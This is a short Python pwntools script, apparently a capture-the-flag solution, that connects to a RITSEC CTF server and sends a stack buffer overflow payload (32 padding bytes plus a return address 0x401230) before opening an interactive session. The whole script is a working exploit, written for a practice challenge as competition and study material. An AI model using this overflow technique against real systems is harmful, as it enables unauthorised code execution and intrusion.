from pwn import *

p = remote("ctf.ritsec.club", 31746)
# p = process("./test_gumponent")

payload  = b'A'*0x20
payload += p64(0x401230)
p.sendline(payload)

p.interactive()
